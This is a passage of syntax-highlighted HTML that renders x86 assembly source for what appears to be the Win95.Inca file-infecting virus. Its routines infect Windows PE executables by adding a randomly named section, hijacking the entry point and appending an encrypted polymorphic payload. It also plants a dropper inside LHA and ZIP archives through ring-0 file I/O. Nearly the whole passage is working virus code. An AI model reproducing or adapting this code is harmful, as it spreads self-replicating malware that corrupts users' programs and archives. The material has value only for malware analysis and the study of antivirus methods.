</span><span class="sc5">PEName</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\W95INCA.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FAdress</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">_CreateFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_WinExec</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_DeleteFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_Sleep</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">PELoaderEnd</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">PELoaderSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoaderEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc0">


  </span><span class="sc5">InfectPEFile</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;esi point to maped base</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;ebp point to PE header</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;is already infected?</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">PE_done</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400000h</span><span class="sc0">                      </span><span class="sc1">;normal base for appz</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoadBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">PE_done</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">4h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">                       </span><span class="sc1">;not infect DLL</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">PE_done</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;numba of sectionz</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
         </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;header size</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;edi point to free entry</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">repz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                            </span><span class="sc1">;is really a free entry?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">PE_done</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;inc number of sectionz</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;make new name</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
  </span><span class="sc5">mName</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">                              </span><span class="sc1">;random letter for a random</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111b</span><span class="sc0">                       </span><span class="sc1">;name</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">mName</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e0000040h</span><span class="sc0">    </span><span class="sc1">;set section attribz</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;prev virtual address</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">08</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;prev virtual size</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ObjAlign</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;virtual address</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;prev offset to data</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;prev size of data</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileAlign</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;offset to data</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyPESize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">totsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ObjAlign</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">80</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FileAlign</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OldIP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_base</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyPEBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyPESize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;zopy PE poly to end of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30000h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">PELoader</span><span class="sc0">            </span><span class="sc1">;copy the PE loader</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PELoaderSize</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;and the DOS loader</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encript_pe</span><span class="sc0">                       </span><span class="sc1">;encript virus code</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_sucess</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;is infected!</span><span class="sc0">
  </span><span class="sc5">PE_done</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ObjAlign</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AlignThis</span><span class="sc0">
</span><span class="sc5">FileAlign</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">AlignThis</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">sAlign</span><span class="sc0">                             </span><span class="sc1">;dont waste aligns when isnt</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;need</span><span class="sc0">
  </span><span class="sc5">sAlign</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">


  </span><span class="sc5">LHAInfect</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">                         </span><span class="sc1">;if read-only, exit</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">                 </span><span class="sc1">;(is our marker)</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHAFilename</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Random4Name</span><span class="sc0">                      </span><span class="sc1">;create random name</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LHACompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LHAUncompressedSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Pad</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'hl'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitFree</span><span class="sc0">                          </span><span class="sc1">;is really a LHA/LHZ shit?</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LHAHeaderSize</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHAMethod</span><span class="sc0">
  </span><span class="sc5">CheckSumLoop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">CheckSumLoop</span><span class="sc0">                     </span><span class="sc1">;funny header checksum loop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LHAHeaderCRC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LHAHeaderSize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">LHASig</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;write it</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">Pad</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitRO</span><span class="sc0">

  </span><span class="sc5">InfectZIP</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileAttr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">                 </span><span class="sc1">;create dropper</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPRCRC32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ZIPLCRC32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
